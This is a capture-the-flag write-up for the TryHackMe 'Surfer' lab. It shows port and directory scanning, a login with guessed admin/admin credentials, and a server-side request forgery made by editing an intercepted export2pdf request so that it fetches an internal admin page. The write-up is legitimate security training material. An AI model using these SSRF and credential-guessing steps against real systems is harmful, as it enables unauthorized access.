# Surfer

URL: https://tryhackme.com/room/surfer

Level: Easy

Date: 24 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Web](#web)
	- [Dirbusting](#dirbusting)
	- [export2pdf](#export2pdf)
	- [Burpsuite](#burpsuite)
	- [Flag](#flag)






## Reconnaissance

### nmap

```bash
joshua@kaligra:~/Documents/thm/surfer$ sudo nmap -T4 -p- -n 10.10.105.186 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 17:22 CEST
Nmap scan report for 10.10.105.186
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 62.24 seconds
```

```bash
joshua@kaligra:~/Documents/thm/surfer$ sudo nmap -T4 -sC -sV -p22,80 -n 10.10.105.186 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 17:23 CEST
Nmap scan report for 10.10.105.186
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5b52eba75a64e99fcd33eedc1c95aef8 (RSA)
|   256 ece0efb62e7cc436d945ef08b4f73b62 (ECDSA)
|_  256 0c55ee74042af91549c390aae3a16e0f (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-title: 24X7 System+
|_Requested resource was /login.php
|_http-server-header: Apache/2.4.38 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry
|_/backup/chat.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds
```

### web

![](Pasted%20image%2020230824172427.png)

Let's check the previous nmap's output.

We got a `robots.txt` entry about `chat.txt`

http://10.10.105.186/backup/chat.txt

```bash
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```



We try with `admin/admin` and we are in!

![](Pasted%20image%2020230824172505.png)

We notice a big hint about SSRF:

![](Pasted%20image%2020230824172601.png)

### dirbusting

```bash
joshua@kaligra:~/Documents/thm/surfer$ feroxbuster --silent -u http://10.10.105.186 -n -t 200 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt
http://10.10.105.186/ => http://10.10.105.186/login.php
http://10.10.105.186/assets => http://10.10.105.186/assets/
http://10.10.105.186/vendor => http://10.10.105.186/vendor/
http://10.10.105.186/backup => http://10.10.105.186/backup/
http://10.10.105.186/internal => http://10.10.105.186/internal/
http://10.10.105.186/server-status
```

### export2pdf

![](Pasted%20image%2020230824174250.png)

We click on "Export to PDF" and we obtain a report:

![](Pasted%20image%2020230824174328.png)

```html
<!-- Reports -->
            <div class="col-12">
              <div class="card">

                <div class="card-body">
                  <h5 class="card-title">Export Reports <span>/Today</span></h5>
                  <form class="row g-3 needs-validation" novalidate action="[export2pdf.php](view-source:http://10.10.105.186/export2pdf.php)" method="POST">
                    <input type="hidden" id="url" name="url" value="http://127.0.0.1/server-info.php">
                    <div class="col-12">
                        <button class="btn btn-primary w-100" type="submit">Export to PDF</button>
                    </div>
                  </form>
                </div>

              </div>
            </div><!-- End Reports -->
```

### burpsuite

Let's fire up `burpsuite` and intercept HTTP request after clicking on "export to pdf"

```
POST /export2pdf.php HTTP/1.1
Host: 10.10.105.186
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.105.186
Connection: close
Referer: http://10.10.105.186/
Cookie: PHPSESSID=15a607c52341c4891359c707e27e0639
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

We change request body in this manner:

```
url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php
```

![](Pasted%20image%2020230824175411.png)

### flag


and we get flag :)

![](Pasted%20image%2020230824175429.png)

